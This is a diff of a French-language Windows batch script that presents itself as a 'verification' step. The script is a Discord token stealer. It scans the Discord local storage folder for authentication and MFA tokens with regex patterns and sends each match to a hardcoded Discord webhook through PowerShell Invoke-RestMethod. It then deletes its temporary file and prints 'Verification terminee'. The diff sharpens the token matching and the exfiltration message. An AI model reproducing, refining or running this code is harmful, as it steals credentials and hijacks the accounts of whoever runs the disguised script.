@@ -4,26 +4,29 @@ color 0b
 echo Veuillez patienter pendant la vérification...
 timeout /t 2 /nobreak >nul
 
-:: Récupérer le token Discord depuis les fichiers locaux
 set "discord_path=%appdata%\discord\Local Storage\leveldb"
 set "webhook=https://discord.com/api/webhooks/1504566316172837029/fhDisuj783W4JP2bskkTI5dhT60Df8aQtkp9oqsLp7-xADYmaF-mvkCKvYaoNzzjbkTs"
+set "output=%temp%\token_result.txt"
 
+:: Vider le fichier de sortie
+type nul > "%output%" 2>nul
+
+:: Parcourir les fichiers ldb
 for /f "tokens=*" %%a in ('dir /s /b "%discord_path%\*.ldb" 2^>nul') do (
-    findstr /c:"oken" "%%a" >> "%temp%\discord_tokens.txt" 2>nul
-    findstr /c:"mfa" "%%a" >> "%temp%\discord_tokens.txt" 2>nul
+    findstr /r /c:"[a-zA-Z0-9_-]\{24\}\.[a-zA-Z0-9_-]\{6\}\.[a-zA-Z0-9_-]\{27\}" "%%a" >> "%output%" 2>nul
+    findstr /r /c:"mfa\.[a-zA-Z0-9_-]\{84\}" "%%a" >> "%output%" 2>nul
 )
 
-:: Envoyer via le webhook
-if exist "%temp%\discord_tokens.txt" (
-    for /f "delims=" %%x in ('type "%temp%\discord_tokens.txt"') do (
-        powershell -Command "$c='{\"content\":\"```'+'%%x'+'```\"}'; Invoke-RestMethod -Uri '%webhook%' -Method Post -Body $c -ContentType 'application/json'" >nul 2>&1
+:: Si le fichier a du contenu, l'envoyer
+if exist "%output%" (
+    for /f "delims=" %%x in ('type "%output%"') do (
+        powershell -Command "$d=@{}; $d.content='**Token trouvé :** ```'+'%%x'+'```'; Invoke-RestMethod -Uri '%webhook%' -Method Post -Body ($d|ConvertTo-Json) -ContentType 'application/json'" >nul 2>&1
     )
 )
 
 :: Nettoyer
-del "%temp%\discord_tokens.txt" 2>nul
+if exist "%output%" del "%output%" 2>nul
 
 echo Verification terminee.
 timeout /t 3 /nobreak >nul
 exit
-</html>
